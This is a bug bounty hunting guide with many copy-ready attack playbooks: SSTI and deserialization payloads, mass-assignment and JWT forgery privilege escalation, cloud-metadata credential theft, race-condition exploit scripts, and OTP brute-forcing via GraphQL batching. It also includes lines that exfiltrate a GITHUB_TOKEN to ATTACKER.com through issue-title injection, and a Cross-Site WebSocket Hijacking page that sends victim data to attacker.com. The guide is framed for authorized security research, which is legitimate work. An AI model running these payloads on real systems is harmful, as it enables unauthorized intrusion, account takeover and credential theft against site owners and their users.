# Advanced Bug Bounty Hunting Techniques

Techniques and methodology that go beyond basic recon and single-bug hunting.

---

## 1. A->B Bug Signal Method (Full Version)

When you confirm bug A, these related bugs are statistically likely nearby. Never stop at a single finding -- always cluster hunt.

### Known A->B->C Chains

| Finding A | Signals -> B | Signals -> C |
|-----------|-------------|-------------|
| S3 bucket listing | JS bundle analysis | Hardcoded OAuth client_secret |
| IDOR read | IDOR write (PUT/DELETE) | Mass data exfil |
| Open redirect | OAuth code theft | Full ATO |
| SSRF (partial) | Cloud metadata access | AWS credential theft |
| XSS (reflected) | Stored XSS elsewhere | Cookie theft -> ATO |
| Rate limit bypass | OTP brute force | ATO |
| GraphQL introspection | Unauthorized query fields | Data exfil |
| Exposed .git | Source code download | Hardcoded secrets |
| Debug mode enabled | Stack trace info leak | Internal path disclosure -> LFI |
| Weak JWT secret | Token forgery | Admin impersonation |

### The 6-Step Cluster Hunt Protocol

1. **CONFIRM A** -- Reproduce, get solid PoC with screenshots/curl commands
2. **MAP SIBLINGS** -- Find all related endpoints/functions (same controller, same service, same auth middleware)
3. **TEST SIBLINGS** -- Apply same attack pattern to each sibling. If `/api/v2/users/123` has IDOR, test `/api/v2/orders/123`, `/api/v2/invoices/123`, etc.
4. **CHAIN UP** -- Can A + B give you higher impact? Open redirect alone = Informative. Open redirect + OAuth code interception = ATO = Critical.
5. **QUANTIFY** -- How many users/records affected? "All 50,000 users" hits harder than "some users."
6. **REPORT** -- Write A and the chain separately (more bounties). The standalone finding is one report; the chain is a second report with higher severity.

### Real Examples

**Coinbase Chain**: S3 bucket listing -> enumerate JS bundles -> grep for OAuth client_secret -> found PKCE not enforced -> full OAuth code theft chain = 3 separate reports (Low + Medium + High)

**Vienna Chain**: Chatbot XSS -> chatbot IDOR -> user data exposed = 2 separate P2 reports

**Worldcoin Chain**: GraphQL passthrough -> unauthorized queries -> timing-based HMAC bypass = 2 separate reports

### Why This Works

Most developers copy-paste patterns within a service. If one endpoint has a missing auth check, the neighboring endpoints written in the same sprint likely have the same gap. Bug density is not uniform -- it clusters around specific modules, specific developers, and specific time periods.

---

## 2. Framework-Specific Attack Playbooks

### Next.js

```bash
# Server Actions CSRF -- Origin: null bypass
# Next.js Server Actions check Origin header, but "null" Origin bypasses some implementations
curl -X POST https://target.com/action -H "Origin: null" -H "Content-Type: application/json" -d '{"action":"deleteAccount"}'

# Image optimizer SSRF via redirect
# The /_next/image endpoint follows redirects -- host an image URL that 302s to internal
curl "https://target.com/_next/image?url=https://your-server.com/redirect-to-metadata&w=128&q=75"

# Middleware bypass via _next/data
# Middleware runs on page routes but sometimes skips _next/data JSON requests
curl "https://target.com/_next/data/BUILD_ID/admin/dashboard.json"

# Exposed __NEXT_DATA__ with sensitive props
curl -s https://target.com/dashboard | grep -o '__NEXT_DATA__.*</script>' | python3 -c "import sys,json; d=json.loads(sys.stdin.read().replace('__NEXT_DATA__ = ','').replace('</script>','')); print(json.dumps(d['props'], indent=2))"

# rewrites proxy creating SSRF
# Check next.config.js for rewrites like { source: '/api/:path*', destination: 'http://internal/:path*' }
curl "https://target.com/api/../../admin/internal-endpoint"
```

**Priority checks**: `__NEXT_DATA__` on every authenticated page, `/_next/image` SSRF, middleware bypass on admin routes.

### Laravel

```bash
# Debug mode -> RCE via Ignition (CVE-2021-3129)
curl -s https://target.com/_ignition/health-check
# If 200 with JSON -> Ignition is exposed -> check exploit chain

# Exposed dashboards
curl -sI https://target.com/horizon  # Queue dashboard
curl -sI https://target.com/telescope  # Request inspector (shows all requests, queries, logs)
curl -sI https://target.com/nova      # Admin panel
curl -sI https://target.com/pulse     # Performance monitoring

# APP_KEY leak -> session/cookie forging
# Check .env exposure
curl -s https://target.com/.env | grep APP_KEY
# If found: forge Laravel session cookies to impersonate any user

# Mass assignment in Eloquent models
# GET the user object to see all fields, then PATCH/PUT with extra fields
curl -X PUT https://target.com/api/profile -H "Content-Type: application/json" \
  -d '{"name":"hacker","is_admin":true,"role":"admin","credits":999999}'

# Laravel debug error page leaks
# Trigger an error by sending malformed input -> stack trace reveals file paths, DB config, etc.
curl "https://target.com/api/users/not-a-number"
```

### Spring Boot

```bash
# Actuator endpoints -- gold mine if exposed
curl -s https://target.com/actuator/ | python3 -m json.tool
curl -s https://target.com/actuator/env           # Environment variables (secrets!)
curl -s https://target.com/actuator/heapdump -o heap.bin  # Memory dump -> grep for passwords
curl -s https://target.com/actuator/configprops    # All configuration properties
curl -s https://target.com/actuator/mappings       # All URL mappings (hidden endpoints!)
curl -s https://target.com/actuator/jolokia/list   # JMX beans -> possible RCE

# Alternative paths (if /actuator is blocked)
curl -s https://target.com/manage/env
curl -s https://target.com/admin/actuator/env
curl -s https://target.com/actuator/..;/env  # Tomcat path normalization bypass

# HeapDump analysis
# Download heapdump, then:
# strings heap.bin | grep -i "password\|secret\|token\|aws_access"
# Or use Eclipse MAT for structured analysis

# SpEL injection in error messages
curl "https://target.com/api/search?q=\${7*7}"
# If response contains "49" -> SpEL injection -> RCE

# Thymeleaf SSTI
curl "https://target.com/path?lang=__\${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"
```

### Django

```bash
# Debug toolbar exposed (only in DEBUG=True, but some targets leave it on)
curl -s https://target.com/__debug__/
curl -s https://target.com/debug/

# SECRET_KEY in .env -> session forging
curl -s https://target.com/.env | grep SECRET_KEY
# With SECRET_KEY: forge Django session cookies (use django-session-forger)

# ORM injection via __ lookups (Django-specific)
# Django ORM uses __ for field lookups -- user input in filter() can traverse relations
curl "https://target.com/api/users?filter=password__startswith=a"
curl "https://target.com/api/users?filter=email__regex=.*"
curl "https://target.com/api/users?order_by=password"  # Boolean oracle via ordering

# Admin panel check
curl -sI https://target.com/admin/
curl -sI https://target.com/admin/login/
# If accessible: try default creds, check for user enumeration via error messages
```

### WordPress

```bash
# xmlrpc.php brute force + pingback SSRF
# Check if xmlrpc is enabled
curl -s -X POST https://target.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

# Brute force via xmlrpc (WAF bypass -- sends multiple passwords per request)
curl -X POST https://target.com/xmlrpc.php -d '<?xml version="1.0"?>
<methodCall><methodName>wp.getUsersBlogs</methodName><params>
<param><value>admin</value></param>
<param><value>password123</value></param>
</params></methodCall>'

# REST API user enumeration
curl -s https://target.com/wp-json/wp/v2/users | python3 -m json.tool
curl -s "https://target.com/?author=1"  # Redirects to /author/USERNAME/

# Plugin/theme enumeration
curl -s https://target.com/wp-content/plugins/ 2>/dev/null
# Use wpscan for thorough enumeration:
# wpscan --url https://target.com --enumerate p,t,u

# Subscriber -> Admin escalation via plugin bugs
# After creating subscriber account: test all admin-ajax.php actions
curl -X POST https://target.com/wp-admin/admin-ajax.php \
  -H "Cookie: wordpress_logged_in_xxx=SUBSCRIBER_COOKIE" \
  -d "action=PLUGIN_ACTION&role=administrator"
```

### Ruby on Rails

```bash
# YAML deserialization RCE (older Rails + psych gem)
# If target accepts YAML content type:
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/x-yaml" \
  -d '--- !ruby/object:Gem::Installer i: x'

# Mass assignment (check permit calls in controllers)
# Rails uses strong parameters, but sometimes fields are missed
curl -X PATCH https://target.com/api/users/me \
  -H "Content-Type: application/json" \
  -d '{"user":{"admin":true,"role":"superadmin","verified":true}}'

# Secret key leak -> session cookie forging
# Check for exposed credentials.yml.enc key or SECRET_KEY_BASE in environment
curl -s https://target.com/.env | grep SECRET_KEY_BASE
# Rails session cookies are signed with this key -- can forge any session

# Path traversal in send_file
curl "https://target.com/download?file=../../../etc/passwd"
curl "https://target.com/download?file=....//....//....//etc/passwd"
```

### GraphQL

```graphql
# Introspection (even when "disabled" -- try POST + GET + different content types)
# Standard introspection
{__schema{types{name,fields{name,type{name,kind,ofType{name,kind}}}}}}

# Sometimes only the full query word is blocked -- use aliasing
{__schema{queryType{name}mutationType{name}types{name fields{name}}}}

# Or a GET request when POST is blocked
# GET /graphql?query={__schema{types{name}}}

# Suggestion abuse (type incomplete query, read error messages for field names)
{ use }
# Error: "Did you mean 'user'? 'users'? 'userAdmin'? 'userInternal'?"

# Batched queries for rate limit bypass (send 1000 login attempts in one request)
[
  {"query":"mutation{login(email:\"victim@test.com\",otp:\"0001\"){token}}"},
  {"query":"mutation{login(email:\"victim@test.com\",otp:\"0002\"){token}}"},
  {"query":"mutation{login(email:\"victim@test.com\",otp:\"0003\"){token}}"}
]

# Alias-based IDOR (fetch multiple users in one request)
{
  a1: user(id: "1") { email ssn }
  a2: user(id: "2") { email ssn }
  a3: user(id: "3") { email ssn }
}

# Nested query DoS (resource exhaustion)
{
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              author { id }
            }
          }
        }
      }
    }
  }
}

# Mutation authorization bypass
# Sometimes query-level auth exists but mutation-level doesn't
mutation { updateUserRole(userId: "victim", role: ADMIN) { id role } }
mutation { deletePost(id: "someone-elses-post") { id } }
mutation { transferCredits(to: "attacker", amount: 9999) { balance } }
```

---

## 3. Mobile App Testing Playbook

### Android

```bash
# Decompile APK
apktool d target.apk -o target_src
jadx target.apk -d target_jadx

# Find hardcoded secrets
grep -rn "api_key\|secret\|password\|token\|Bearer" target_jadx/
grep -rn "https://\|http://" target_jadx/ | grep -v "google\|android\|schema\|xmlns"

# Check AndroidManifest.xml for exported components
grep -i 'exported="true"' target_src/AndroidManifest.xml
grep -i "android:permission" target_src/AndroidManifest.xml

# Find deep link handlers (potential injection points)
grep -A5 '<data android:scheme' target_src/AndroidManifest.xml

# Check for cleartext traffic
grep -i "cleartextTrafficPermitted\|usesCleartextTraffic" target_src/AndroidManifest.xml
grep -i "cleartextTrafficPermitted" target_src/res/xml/network_security_config.xml

# Check for backup enabled (data extraction on rooted device)
grep -i 'allowBackup="true"' target_src/AndroidManifest.xml

# Intercept traffic with certificate pinning bypass
# Install Frida + objection
objection -g com.target.app explore
# Then inside objection:
# android sslpinning disable
# android root disable

# Extract shared preferences (rooted device)
adb shell cat /data/data/com.target.app/shared_prefs/*.xml

# Extract SQLite databases
adb pull /data/data/com.target.app/databases/

# Check for WebView vulnerabilities
grep -rn "loadUrl\|addJavascriptInterface\|setJavaScriptEnabled" target_jadx/
# loadUrl with user input = XSS
# addJavascriptInterface = JS->Java bridge (possible RCE on API < 17)
```

### iOS

```bash
# Extract IPA from jailbroken device
frida-ios-dump -u com.target.app

# Binary analysis -- extract strings
strings target.app/target | grep -i "api\|key\|secret\|http\|password\|token"

# Class dump for method names (find hidden functionality)
class-dump -H target.app/target -o headers/
grep -rn "admin\|debug\|hidden\|internal\|test" headers/

# Check Info.plist for URL schemes and transport security exceptions
plutil -p target.app/Info.plist | grep -i "transport\|scheme\|query\|exception"
# ATS exceptions = cleartext traffic allowed to specific domains

# Check for data in Keychain (jailbroken device)
# Use keychain-dumper or objection
objection -g com.target.app explore
# ios keychain dump

# Runtime manipulation with Frida
frida -U -f com.target.app -l bypass_ssl.js
# Common scripts: bypass SSL pinning, bypass jailbreak detection, bypass biometrics

# Check for sensitive data in pasteboard
# Apps that copy tokens/passwords to clipboard = data leak to other apps
```

### Common Mobile Bugs

| Bug | Where to Find | Impact |
|-----|---------------|--------|
| Hardcoded API keys | Decompiled source, strings command | Depends on key scope |
| Certificate pinning bypass | Frida/objection | MitM on all traffic |
| Exported components | AndroidManifest.xml | Launch internal activities |
| Deep link injection | URL scheme handlers | Trigger actions without auth |
| Local data storage (cleartext) | SharedPreferences, SQLite, Keychain | Credential theft on shared device |
| WebView XSS | loadUrl with user-controlled data | Cookie theft, phishing |
| Intent redirection | startActivity with untrusted Intent | Access internal components |
| Backup extraction | android:allowBackup="true" | Extract app data via ADB |
| Insecure logging | adb logcat | Tokens/PII in logs |
| Biometric bypass | Frida hooking on auth callback | Bypass fingerprint/face auth |

---

## 4. CI/CD Pipeline Attacks

### GitHub Actions

```yaml
# DANGEROUS PATTERN: pull_request_target + checkout of PR code
# pull_request_target runs in the context of the BASE repo (has secrets)
# But if it checks out the PR branch, attacker code runs WITH those secrets
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # VULN: checks out attacker's code
  - run: make build  # Attacker-controlled Makefile runs with repo secrets
```

**What to look for in `.github/workflows/*.yml`:**

```bash
# Clone target repo (or browse on GitHub)
# Search for dangerous patterns:

# 1. pull_request_target with checkout of PR code
grep -rn "pull_request_target" .github/workflows/
grep -rn "github.event.pull_request.head" .github/workflows/

# 2. Expression injection -- user-controlled data in run: commands
grep -rn '${{ github.event' .github/workflows/ | grep "run:"
# Dangerous: ${{ github.event.issue.title }} in a run: block
# Attacker creates issue with title: "; curl https://evil.com/$(cat $GITHUB_TOKEN) #"

# 3. Secrets referenced in workflow files
grep -rn 'secrets\.' .github/workflows/

# 4. Artifact upload/download without integrity checks
grep -rn "actions/upload-artifact\|actions/download-artifact" .github/workflows/
# Artifact poisoning: upload malicious artifact in PR, workflow downloads and executes it

# 5. Self-hosted runners (escape to host infrastructure)
grep -rn "runs-on:.*self-hosted" .github/workflows/
```

**Expression injection PoC:**
```
# Create a GitHub issue with this title:
test"; curl https://ATTACKER.com/$(echo $GITHUB_TOKEN | base64) #

# If workflow uses ${{ github.event.issue.title }} in a run: block,
# the secret gets exfiltrated
```

### GitLab CI

```bash
# Check .gitlab-ci.yml for:

# 1. Shared runners with Docker socket mounted (container escape)
grep -rn "docker.sock\|/var/run/docker" .gitlab-ci.yml

# 2. CI variables accessible to all branches (fork can access secrets)
# Check Settings -> CI/CD -> Variables -> "Protect variable" unchecked

# 3. Pipeline triggers from forks
grep -rn "only:\|rules:" .gitlab-ci.yml
# If no branch restrictions, forked MR can trigger pipeline with secrets

# 4. Include from external source (supply chain)
grep -rn "include:" .gitlab-ci.yml
# External includes can be hijacked if the source is compromised
```

### Jenkins

```bash
# Exposed Jenkins consoles
curl -sI https://target.com/jenkins/
curl -sI https://target.com/jenkins/script  # Groovy script console = instant RCE

# If script console is accessible:
# println "whoami".execute().text

# Check for credentials stored in plaintext
# /var/lib/jenkins/credentials.xml
# /var/lib/jenkins/config.xml

# Jenkins API user enumeration
curl -s "https://target.com/jenkins/asynchPeople/api/json"

# Build history (may contain secrets in console output)
curl -s "https://target.com/jenkins/job/JOB_NAME/lastBuild/consoleText"
```

### General CI/CD Checks

```bash
# Look for CI config files in any public repo
ls -la .github/workflows/ .gitlab-ci.yml .circleci/config.yml Jenkinsfile .travis.yml bitbucket-pipelines.yml 2>/dev/null

# Common secrets exposed in CI logs:
# - Docker registry credentials
# - Cloud provider tokens (AWS_ACCESS_KEY_ID, GOOGLE_APPLICATION_CREDENTIALS)
# - NPM tokens
# - Database connection strings
# - Signing keys
```

---

## 5. API Testing Deep Dive

### REST API

```bash
# Method override -- bypass WAF or method restrictions
curl -X POST https://target.com/api/admin/users -H "X-HTTP-Method-Override: DELETE"
curl -X POST https://target.com/api/admin/users -H "X-Method-Override: PUT"
curl -X POST https://target.com/api/admin/users -H "X-Original-Method: PATCH"

# Version downgrade -- older API versions often lack security fixes
curl -s https://target.com/api/v3/users/me   # Current, properly secured
curl -s https://target.com/api/v2/users/me   # Older, might leak more fields
curl -s https://target.com/api/v1/users/me   # Oldest, might skip auth entirely
curl -s https://target.com/api/users/me       # No version, default handler

# Content-Type confusion -- parser differentials
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" -d '{"user":"admin","pass":"x"}'
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/xml" -d '<root><user>admin</user><pass>x</pass></root>'
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/x-www-form-urlencoded" -d 'user=admin&pass=x'

# Mass assignment hunting
# Step 1: GET the object to see all fields
curl -s https://target.com/api/users/me -H "Authorization: Bearer TOKEN" | python3 -m json.tool
# Step 2: PATCH with hidden fields you saw (or guess common ones)
curl -X PATCH https://target.com/api/users/me \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","is_admin":true,"verified":true,"credits":999999,"permissions":["*"]}'

# Pagination abuse -- dump entire database
curl "https://target.com/api/users?limit=999999&offset=0"
curl "https://target.com/api/users?page=1&per_page=100000"
curl "https://target.com/api/users?count=-1"  # Negative values sometimes mean "all"

# Parameter pollution -- send same param twice with different values
curl "https://target.com/api/transfer?from=attacker&to=victim&amount=100&from=victim"
# Which 'from' does the server use? Backend and WAF may disagree.

# JSON parameter pollution
curl -X POST https://target.com/api/transfer \
  -H "Content-Type: application/json" \
  -d '{"user":"attacker","user":"admin"}'  # Duplicate keys -- which one wins?

# IDOR testing pattern
# Get your own ID from the JWT or profile response
# Then systematically test with other IDs
for id in 1 2 3 100 101 999; do
  echo "=== ID: $id ==="
  curl -s "https://target.com/api/users/$id" -H "Authorization: Bearer YOUR_TOKEN" | head -5
done

# UUID/GUID IDOR -- you need to find valid UUIDs first
# Check: response bodies, URL paths in JS files, WebSocket messages, email links
```

### Authentication Bypass Patterns

```bash
# JWT none algorithm attack
# Decode JWT, change alg to "none", remove signature
echo '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' > /tmp/jwt_header
echo '{"sub":"admin","role":"admin"}' | base64 | tr -d '=' > /tmp/jwt_payload
JWT_NONE="$(cat /tmp/jwt_header).$(cat /tmp/jwt_payload)."
curl -s https://target.com/api/admin -H "Authorization: Bearer $JWT_NONE"

# JWT key confusion (RS256 -> HS256)
# If server uses RS256 but accepts HS256, sign with the PUBLIC key as HMAC secret
# The public key is often at /well-known/jwks.json or /.well-known/openid-configuration

# Password reset token prediction
# Request multiple reset tokens, check if they are sequential or based on timestamp
curl -X POST https://target.com/api/forgot-password -d '{"email":"attacker@test.com"}'
# Repeat 5 times, compare the tokens -- any pattern?

# OAuth state parameter -- is it checked?
# Start OAuth flow, capture the callback URL, replay with different state value
# If server accepts: CSRF on OAuth = ATO
```

---

## 6. Timing Side-Channel Attacks

### Detecting Vulnerable Comparisons

```bash
# Find non-constant-time comparisons in source code
# JavaScript/TypeScript
grep -rn '\.digest(' --include="*.ts" --include="*.js" -A 3 | grep '==='
grep -rn '== token\|== secret\|== hash\|== apiKey' --include="*.ts" --include="*.js"

# Python
grep -rn '== token\|== secret\|== hash' --include="*.py"
grep -rn 'hmac.compare_digest\|constant_time_compare' --include="*.py"  # These are SAFE

# Go
grep -rn 'hmac.Equal\|subtle.ConstantTimeCompare' --include="*.go"  # SAFE
grep -rn '== token\|bytes.Equal.*hmac\|string(mac)' --include="*.go"  # UNSAFE

# Ruby
grep -rn 'ActiveSupport::SecurityUtils.secure_compare\|Rack::Utils.secure_compare' --include="*.rb"  # SAFE
grep -rn '== token\|== secret' --include="*.rb"  # UNSAFE

# KEY INSIGHT: If target uses timingSafeEqual in 8/10 places but === in 2/10
# -> report the 2 inconsistent places
# "Inconsistency is proof" -- the deviation from their own security standard IS the evidence
```

### Measuring Timing Differences

```python
import requests
import time
import statistics

def measure_response(url, data, n=50):
    """Measure median response time over n requests."""
    times = []
    for _ in range(n):
        start = time.perf_counter()
        requests.post(url, json=data, verify=True)
        elapsed = time.perf_counter() - start
        times.append(elapsed)
    return statistics.median(times)

url = "https://target.com/api/verify-token"

# Compare: token with correct prefix vs completely wrong token
t_valid_prefix = measure_response(url, {"token": "a1b2c3d4xxxxxxxxxxxx"})  # First bytes match
t_random       = measure_response(url, {"token": "zzzzzzzzzzzzzzzzzzzz"})  # No bytes match

delta_ms = (t_valid_prefix - t_random) * 1000
print(f"Valid prefix: {t_valid_prefix:.4f}s")
print(f"Random:       {t_random:.4f}s")
print(f"Delta:        {delta_ms:.1f}ms")

# Significant difference (>10% or >5ms consistently) = timing oracle
# Can byte-by-byte brute force the token

if abs(delta_ms) > 5:
    print("POSSIBLE TIMING ORACLE -- investigate further")
else:
    print("No significant timing difference detected")
```

### Blind Timing Attacks (No Source Code)

```python
import requests
import time
import statistics

def timing_oracle_test(url, valid_value, invalid_value, param_name="token", n=100):
    """
    Test if an endpoint is vulnerable to timing attacks.
    Requires one known-valid value and one known-invalid value.
    """
    valid_times = []
    invalid_times = []

    for i in range(n):
        # Alternate to avoid network bias
        start = time.perf_counter()
        requests.post(url, json={param_name: valid_value})
        valid_times.append(time.perf_counter() - start)

        start = time.perf_counter()
        requests.post(url, json={param_name: invalid_value})
        invalid_times.append(time.perf_counter() - start)

    v_med = statistics.median(valid_times)
    i_med = statistics.median(invalid_times)
    delta = (v_med - i_med) * 1000

    print(f"Valid median:   {v_med*1000:.2f}ms (stdev: {statistics.stdev(valid_times)*1000:.2f}ms)")
    print(f"Invalid median: {i_med*1000:.2f}ms (stdev: {statistics.stdev(invalid_times)*1000:.2f}ms)")
    print(f"Delta:          {delta:.2f}ms")

    # Statistical significance check
    if abs(delta) > max(statistics.stdev(valid_times), statistics.stdev(invalid_times)) * 1000 * 2:
        print("STATISTICALLY SIGNIFICANT timing difference detected")
    else:
        print("Difference within noise range")
```

---

## 7. WebSocket Security Testing

### Manual Testing

```javascript
// Connect to WebSocket endpoint
const ws = new WebSocket('wss://target.com/ws');

ws.onopen = () => {
    console.log('Connected');

    // Test 1: Send messages without authentication
    // (connect without session cookie -- does it still work?)
    ws.send(JSON.stringify({action: "getProfile"}));

    // Test 2: IDOR -- subscribe to another user's channel
    ws.send(JSON.stringify({action: "subscribe", channel: "user_VICTIM_ID"}));
    ws.send(JSON.stringify({action: "subscribe", channel: "admin_notifications"}));

    // Test 3: XSS injection in messages (stored in other user's view?)
    ws.send(JSON.stringify({message: "<img src=x onerror=alert(document.domain)>"}));

    // Test 4: SQLi in parameters
    ws.send(JSON.stringify({action: "search", query: "' OR 1=1--"}));

    // Test 5: Privilege escalation -- call admin actions
    ws.send(JSON.stringify({action: "admin.listUsers"}));
    ws.send(JSON.stringify({action: "admin.deleteUser", userId: "victim"}));
};

ws.onmessage = (event) => {
    console.log('Received:', event.data);
};
```

### Command-Line Testing

```bash
# Install wscat if not available: npm install -g wscat

# Test 1: Connect without cookies (auth bypass?)
wscat -c "wss://target.com/ws"

# Test 2: Check Origin validation
wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"
# If connection succeeds -> Cross-Site WebSocket Hijacking (CSWSH)

# Test 3: Rate limiting
# Rapid-fire messages to check for DoS or lack of rate limiting
python3 -c "
import websocket, json, time
ws = websocket.create_connection('wss://target.com/ws')
for i in range(1000):
    ws.send(json.dumps({'message': f'spam_{i}'}))
print('Sent 1000 messages -- check if any rate limiting triggered')
ws.close()
"

# Test 4: Message size limits
python3 -c "
import websocket
ws = websocket.create_connection('wss://target.com/ws')
ws.send('A' * 10000000)  # 10MB message -- does it crash?
ws.close()
"
```

### Cross-Site WebSocket Hijacking (CSWSH)

```html
<!-- Host this on attacker site. If WebSocket doesn't validate Origin,
     visiting this page steals data from victim's WS connection -->
<script>
var ws = new WebSocket('wss://target.com/ws');
// Browser sends victim's cookies automatically

ws.onopen = function() {
    ws.send(JSON.stringify({action: "getProfile"}));
};

ws.onmessage = function(event) {
    // Exfiltrate data
    fetch('https://attacker.com/log?data=' + encodeURIComponent(event.data));
};
</script>
```

---

## 8. Cloud Misconfigurations

### AWS

```bash
# S3 bucket enumeration and testing
aws s3 ls s3://TARGET-bucket --no-sign-request 2>/dev/null
aws s3 ls s3://TARGET-bucket --no-sign-request --recursive | head -50
aws s3 cp s3://TARGET-bucket/interesting-file.txt /tmp/ --no-sign-request

# Common bucket naming patterns
for prefix in TARGET TARGET-dev TARGET-staging TARGET-prod TARGET-backup TARGET-logs TARGET-assets TARGET-uploads TARGET-data; do
  aws s3 ls "s3://$prefix" --no-sign-request 2>/dev/null && echo "OPEN: $prefix"
done

# S3 write test (only if in scope!)
echo "bugbounty-test" > /tmp/test.txt
aws s3 cp /tmp/test.txt "s3://TARGET-bucket/bugbounty-proof.txt" --no-sign-request
# If succeeds -> Critical: unauthenticated S3 write

# Cognito user pool misconfiguration
# If you find a Cognito User Pool ID and Client ID (check JS source):
aws cognito-idp sign-up \
  --client-id CLIENT_ID \
  --username attacker@test.com \
  --password 'P@ssw0rd123!' \
  --region us-east-1
# If sign-up works without admin approval -> unauthorized account creation

# Lambda function URLs (public, no auth)
curl -s "https://FUNCTION_ID.lambda-url.REGION.on.aws/"
# Try with different methods and paths

# EC2 metadata from SSRF
# IMDSv1 (no token needed)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns temporary AWS credentials (AccessKeyId, SecretAccessKey, Token)

# IMDSv2 (requires token -- but if you have SSRF, you can get it)
TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ -H "X-aws-ec2-metadata-token: $TOKEN"

# Test stolen AWS credentials
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...  # If temporary creds
aws sts get-caller-identity  # Who am I?
aws s3 ls                    # What can I access?
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)

# ECS/EKS metadata (container escape)
curl http://169.254.170.2/v2/credentials/GUID  # ECS task credentials
curl -s http://169.254.169.254/latest/user-data  # May contain bootstrap secrets
```

### GCP

```bash
# Open storage buckets
curl -s "https://storage.googleapis.com/TARGET-bucket/"
gsutil ls gs://TARGET-bucket/ 2>/dev/null
# If XML listing returned -> bucket is publicly listable

# Firebase Realtime Database (extremely common misconfiguration)
curl -s "https://TARGET.firebaseio.com/.json"
# If returns data (not "Permission denied") -> open Firebase database
# Try writing:
curl -X PUT "https://TARGET.firebaseio.com/test.json" -d '"bugbounty-proof"'

# Firestore REST API
curl -s "https://firestore.googleapis.com/v1/projects/TARGET_PROJECT/databases/(default)/documents/users"

# GCP metadata from SSRF
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# GCP service account key (if leaked)
gcloud auth activate-service-account --key-file=leaked-key.json
gcloud projects list
gcloud compute instances list
```

### Azure

```bash
# Blob storage enumeration
curl -s "https://TARGET.blob.core.windows.net/CONTAINER?restype=container&comp=list"
# Common container names: images, uploads, backups, data, public, assets, logs

for container in images uploads backups data public assets logs files media documents; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://TARGET.blob.core.windows.net/$container?restype=container&comp=list")
  [ "$STATUS" != "404" ] && echo "$container: $STATUS"
done

# Azure AD tenant enumeration
curl -s "https://login.microsoftonline.com/TARGET_DOMAIN/.well-known/openid-configuration"
# Returns tenant ID, token endpoints, supported flows

# Azure AD user enumeration (unauthenticated)
# Some endpoints reveal if a user exists:
curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin@target.com"}'
# Check IfExistsResult: 0 = exists, 1 = doesn't exist

# Azure metadata from SSRF
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Returns Azure AD access token for the managed identity

# Function App URLs (public)
curl -s "https://TARGET-func.azurewebsites.net/api/FUNCTION_NAME"
curl -s "https://TARGET-func.azurewebsites.net/api/FUNCTION_NAME?code=LEAKED_FUNCTION_KEY"
```

### Cross-Cloud Checks

```bash
# DNS records can reveal cloud providers
dig +short TARGET.com CNAME
dig +short TARGET.com TXT
# Look for: *.amazonaws.com, *.cloudfront.net, *.azurewebsites.net, *.appspot.com

# Check common cloud service subdomains
for sub in s3 api cdn assets static img upload backup staging dev admin; do
  dig +short "$sub.TARGET.com" 2>/dev/null | head -1
done

# Dangling DNS (subdomain takeover)
# If CNAME points to deprovisioned service -> claim the resource
# Common: *.s3.amazonaws.com, *.herokuapp.com, *.ghost.io, *.azurewebsites.net
dig +short expired-sub.TARGET.com CNAME
# If CNAME exists but service returns 404/NoSuchBucket -> potential takeover
```

---

## 9. Race Condition Exploitation

### Single-Endpoint Race (TOCTOU)

```python
import asyncio
import aiohttp

async def race_request(session, url, data, headers):
    async with session.post(url, json=data, headers=headers) as resp:
        return await resp.json()

async def exploit_race(url, data, headers, n=20):
    """Send n identical requests simultaneously."""
    async with aiohttp.ClientSession() as session:
        tasks = [race_request(session, url, data, headers) for _ in range(n)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for i, r in enumerate(results):
            print(f"Request {i}: {r}")

# Example: redeem a coupon multiple times
asyncio.run(exploit_race(
    url="https://target.com/api/redeem-coupon",
    data={"code": "DISCOUNT50"},
    headers={"Authorization": "Bearer TOKEN"},
    n=20
))

# Example: withdraw more than balance
asyncio.run(exploit_race(
    url="https://target.com/api/withdraw",
    data={"amount": 100},
    headers={"Authorization": "Bearer TOKEN"},
    n=10
))
```

### Multi-Endpoint Race (Business Logic)

```python
import asyncio
import aiohttp

async def race_two_endpoints(token):
    """Race a transfer and a withdrawal against the same balance."""
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

    async with aiohttp.ClientSession() as session:
        # Create both requests but hold them
        tasks = [
            session.post("https://target.com/api/transfer",
                        json={"to": "user2", "amount": 500}, headers=headers),
            session.post("https://target.com/api/withdraw",
                        json={"amount": 500}, headers=headers),
        ]
        # Fire simultaneously
        results = await asyncio.gather(*[t.__aenter__() for t in tasks])
        for r in results:
            body = await r.json()
            print(f"{r.status}: {body}")

asyncio.run(race_two_endpoints("YOUR_TOKEN"))
